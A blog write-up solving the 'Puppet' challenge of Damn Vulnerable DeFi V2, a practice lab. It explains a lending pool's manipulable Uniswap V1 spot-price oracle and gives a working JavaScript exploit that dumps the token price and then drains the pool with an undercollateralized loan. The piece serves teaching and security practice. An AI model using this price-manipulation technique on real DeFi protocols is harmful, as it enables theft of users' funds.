@@ -1,0 +1,80 @@
+# Damn Vulnerable DeFi V2 - #8 Puppet
+
+<p className="text-xs text-right">February 23, 2022 by [patrickd](/about#patrickd)</p>
+
+This is part 5 of the write-up series on Damn Vulnerable DeFi V2. Please consider attempting to solve it on your own first since it's a lot less fun after being spoiled!
+
+---
+
+>[**Challenge #8 - Puppet**](https://www.damnvulnerabledefi.xyz/challenges/8.html)
+>
+>There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
+>
+>There's a DVT market opened in an [Uniswap v1 exchange](https://docs.uniswap.org/protocol/V1/introduction), currently with 10 ETH and 10 DVT in liquidity.
+>
+>Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.
+
+This sounds like a classic case of AMM price manipulation allowing us to take an undercollateralized loan...
+
+## Code Review
+
+First, looking at the testcases in [puppet.challenge.js](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/puppet/puppet.challenge.js) we can see that this challenge uses an already compiled build of Uniswap V1 (`build-uniswap-v1` folder). Since I doubt that this challenge wants us to do any reverse engineering, we can probably safely assume that this is the original Uniswap V1 build without changes and we can use the official documentation to interact with it (which was linked in the challenge text above).
+
+The scenario setup code is quite long but can be summarized like this:
+
+1. Send 25 ether to attacker EOA
+2. Deploy DVT token contract
+3. Deploy UniswapExchange contract as a factory template and the UniswapFactory itself
+4. Use UniswapFactory to create an exchange for the DVT token
+5. Deploy the vulnerable PuppetPool lending contract for DVT and tell it to use the exchange as price oracle
+6. Provide 10 DVT and 10 ETH as liquidity to the Uniswap exchange
+7. Give 1000 DVT to attacker and 100000 to the PuppetPool
+
+The success condition is simple: The PuppetPool no longer has any DVT because the attacker account now owns all of them.
+
+---
+
+Aside from the Uniswap contracts and the DVT token, which we should already be quite comfortable with at this point, there's only one contract to look at this time: [PuppetPool.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/puppet/PuppetPool.sol) which does exactly what it was described to do, allowing to borrow DVT in exchange for depositing two times of their value in ether as collateral. Functions for paying back the loan or interest rates were apparently omitted for simplicity.
+
+The most interesting part of PuppetPool is the "oracle" function though:
+
+```solidity filename="PuppetPool.sol"
+function _computeOraclePrice() private view returns (uint256) {
+    // calculates the price of the token in wei according to Uniswap pair
+    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+}
+```
+
+By changing the balances of ether and DVT in the uniswap exchange pair we can manipulate the price and therefore the amount of collateral required for borrowing tokens from the PuppetPool. We want all of the DVT for as little ether collateral as possible, and for that we first have to cause a price dump. To do that we need to decrease the uniswap pair's ether balance and increase the DVT token balance as much as possible.
+
+## Exploit
+
+The exploit first swaps all of the attacker's DVT for ETH causing a price imbalance and then it takes an undercollateralized loan that we don't intend to ever pay back since we got it so "cheap"!
+
+While writing the exploit I noticed that the success condition requires us to have MORE tokens than the pool did, so just stealing all of them isn't enough, we actually have to swap some back (or swap less for ether to begin with).
+
+```javascript filename="puppet.challenge.js"
+it('Exploit', async function () {
+    // Swap all attacker's initial tokens for ether to dump price.
+    await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+    await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), // All of them [lest 1wei to pass success conditions].
+            1,                                     // We don't care how much ether we get back.
+            9999999999                             // We don't care about the deadline.
+    );
+
+    // Calculate how much collateral we now need to borrow all tokens with the price being manipulated.
+    const collateral = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE); // It's about 20 ether
+    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: collateral });
+});
+```
+
+The exploit allows us to borrow 100000 DVT for a collateral of only around 20 ether instead of 200000 ether!
+
+For simplicity, I didn't bother writing an exploit contract here and instead did it in multiple transactions via ethers. In reality this wouldn't be very practical since arbitrage bots would likely pick up on our price manipulation and balance it out for profit before we'd be able to exploit it.
+
+I also didn't find the official Uniswap V1 documentation to be very useful to get a simple swap working and had to resort to reading the [source code](https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy#L202-L222) in the end.
+
+## Conclusion
+
+This challenge shows quite well that you should avoid trusting on-chain AMM's as price oracles since they can be manipulated easily by wales and flash loans. Here I'd again recommend watching OpenZeppelin's workshop on [The Dangers of Price Oracles in Smart Contracts](https://www.youtube.com/watch?v=YGO7nzpXCeA) to learn more about securely integrating oracles.
